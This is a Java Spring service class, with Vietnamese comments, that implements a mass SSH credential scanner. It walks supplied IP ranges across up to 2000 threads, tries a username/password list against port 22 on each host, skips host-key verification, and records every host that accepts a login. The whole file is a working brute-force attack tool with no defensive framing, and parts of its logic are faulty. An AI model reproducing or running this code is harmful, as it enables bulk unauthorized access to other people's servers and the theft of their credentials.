/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Business;

import Pojos.*;
import Service.IPService;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import net.schmizz.sshj.SSHClient;
import net.schmizz.sshj.transport.verification.PromiscuousVerifier;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class ScanSSH {

    private static final int MaxThread = 2000;
    //thong tin ve ssh se duoc cung cap cho controller
    private long TotalIps = 0;
    private long TotalIpsChecked = 0;
    private int NumberOfThreads;// truyen vao tu controller
    private int NumberOfIpsLive = 0;
    private int CurrentThreadActive = 0;
    // du lieu de ssh hoat dong
    private static Object syncObj = new Object();
    static Object syncObjF = new Object();
    static Object syncObjR = new Object();
    static Object syncObjCNTRY = new Object();
    static Object syncObjLOWCPU = new Object();

    private Thread[] thread;
    private List<RangeIp> ListsRangeIp;
    private List<String> ListsRange; // truyen vao tu controller
    private List<InfoToConnectSSH> ListsResultIps = new ArrayList<>();
    private List<InfoToConnectSSH> ListsUserPass; //truyen vao tu controller
    private boolean[] Bit_CheckIps;
    private static int TotalRange = 0;
    private String String_IpRangeFocus = "";
    private String String_IpRangeEndFocus = "";
    private long Long_IpRangeFocus = 0;
    private long Long_IpRangeEndFocus = 0;
    private int TimeOut = 15;
    private static int CountIpRange = 0;
    private static int IndexOfListRange = 0;
    @Autowired
    IPService iPService;

    //khoi tao cac gia tri ban dau
    public void StartSetting() throws InterruptedException {
        String Message = "";
        //tao list range ip
        ListsRangeIp = iPService.getListRange(ListsRange);
        //tinh tong ip

        TotalIps = iPService.getTotalIps(ListsRangeIp);
        //
        if (ListsRangeIp == null) {
            Message = "khong co du lieu";
            return;
        }
        //
        if (NumberOfThreads > MaxThread) {
            Message = "thread qua nhieu";
            return;
        }

        //tao mang thread
        if (TotalIps <= NumberOfThreads) {
            NumberOfThreads = (int) TotalIps;
        }
        thread = new Thread[NumberOfThreads];
        //tao mang bit_check
        Bit_CheckIps = new boolean[NumberOfThreads];
        //run thread
        for (int i = 0; i < NumberOfThreads; i++) {
            Run(i);
            Thread.sleep(100);
        }

    }

    public void Run(int id_thread) {

        thread[id_thread] = new Thread() {
            @Override
            public void run() {
                try {
                    Check_USER_PASS_START(id_thread);
                } catch (Exception e) {
                    e.getMessage();
                }

            }
        };
        thread[id_thread].start();
    }

    public void stop_now(int id_thread) {
        try {
            for (int i = 0; i < NumberOfThreads; i++) {
                if (i != id_thread) {
                    if (!thread[i].isAlive()) {
                        thread[i].stop();
                    }
                } else {
                    if (!thread[id_thread].isAlive()) {
                        thread[id_thread].stop();
                    }
                }
            }

        } catch (Exception e) {
            e.getMessage();
        }
    }

    public void Check_USER_PASS_START(int id_thread) {

        try {
            while (true) {
                synchronized (syncObj) {
                    //kiem tra con range trong list range khong
                    if (IndexOfListRange <= TotalRange) {

                        Long_IpRangeEndFocus = iPService.ipToLong2(ListsRangeIp.get(IndexOfListRange).getRangeEnd());
                        Long_IpRangeFocus = iPService.ipToLong2(ListsRangeIp.get(IndexOfListRange).getRangeBegin()) + CountIpRange;
                        //ip con trong range khong con thi lam
                        if (Long_IpRangeFocus <= Long_IpRangeEndFocus) {
                            String_IpRangeFocus = iPService.longToIp2(Long_IpRangeFocus);
                            for (int i = 0; i < ListsUserPass.size(); i++) {
                                byte check = CHECK_LIVE(String_IpRangeFocus, ListsUserPass.get(i).getUsername(), ListsUserPass.get(i).getPassword(), id_thread);
                                if (check == 1) {
                                    synchronized (syncObj) {
                                        InfoToConnectSSH info = new InfoToConnectSSH();
                                        info.setHost(String_IpRangeFocus);
                                        info.setUsername(ListsUserPass.get(i).getUsername());
                                        info.setPassword(ListsUserPass.get(i).getPassword());

                                        ListsResultIps.add(info);
                                    }
                                    break;
                                }
                            }

                            // viet ham kiem tra
                            CountIpRange++;
                            TotalIpsChecked++;
                        } else {
                            //het ip trong range , doi sang range tiep theo
                            IndexOfListRange++;
                            CountIpRange = 0;
                        }

                    } else {

                        break;
                    }

                }

            }
        } catch (Exception e) {
            e.getMessage();
        }

    }

    public byte CHECK_LIVE(String STR_IP, String User, String Pass, int id) {

        SSHClient sshClient = new SSHClient();
        sshClient.addHostKeyVerifier(new PromiscuousVerifier());
        sshClient.setTimeout(TimeOut * 1000);
        int port = 22;
        boolean success = false;
        try {

            try {
                sshClient.connect(STR_IP);
                success = true;
            } catch (Exception e) {
                success = false;
            }

            if (!success) {
                sshClient.close();
                return 0;
            }
            sshClient.close();
            if (apply_user_pass(sshClient, STR_IP, User, Pass, port, id) == 1) {

                return 1;
            }

        } catch (Exception e) {
            e.getMessage();
        }
        return 1;
    }

    public byte apply_user_pass(SSHClient s, String hostname, String user, String pass, int port, int id) throws IOException {

        try {
            Bit_CheckIps[id] = false;
            Thread thread = new Thread() {
                @Override
                public void run() {
                    Check_ssh(s, id, hostname, user, pass);
                }
            };
            thread.start();

            int g = 0;
            while ((thread.isAlive() == true) && (g < TimeOut)) {

                Thread.sleep(1000);
                g++;
            }
            thread.stop();

            if (g >= TimeOut) {
                s.close();
                return 0;
            }

            if (Bit_CheckIps[id] == false) {
                s.close();
                return 0;
            }

            s.close();
            return 1;
        } catch (Exception e) {
            e.getMessage();
            s.close();
            return 0;
        }

    }

    public void Check_ssh(SSHClient s, int id, String hostname, String user, String pass) {
        try {
            s.addHostKeyVerifier(new PromiscuousVerifier());
            s.connect(hostname);
            s.authPassword(user, pass);
            Bit_CheckIps[id] = true;
        } catch (Exception ex) {

        }

    }

    //thong tin ve ssh se duoc cung cap cho controller
    public long getTotalIps() {
        return TotalIps;
    }

    public long getTotalIpsChecked() {
        return TotalIpsChecked;
    }

    public int getNumberOfThreads() {
        return NumberOfThreads;
    }

    public int getNumberOfIpsLive() {
        return NumberOfIpsLive;
    }

    public void setNumberOfThreads(int NumberOfThreads) {
        this.NumberOfThreads = NumberOfThreads;
    }

    public void setListsRange(List<String> ListsRange) {
        this.ListsRange = ListsRange;
    }

    public void setListsUserPass(List<InfoToConnectSSH> ListsUserPass) {
        this.ListsUserPass = ListsUserPass;
    }

    public List<InfoToConnectSSH> getListsResultIps() {
        return ListsResultIps;
    }

    public void setListsResultIps(List<InfoToConnectSSH> ListsResultIps) {
        this.ListsResultIps = ListsResultIps;
    }

}
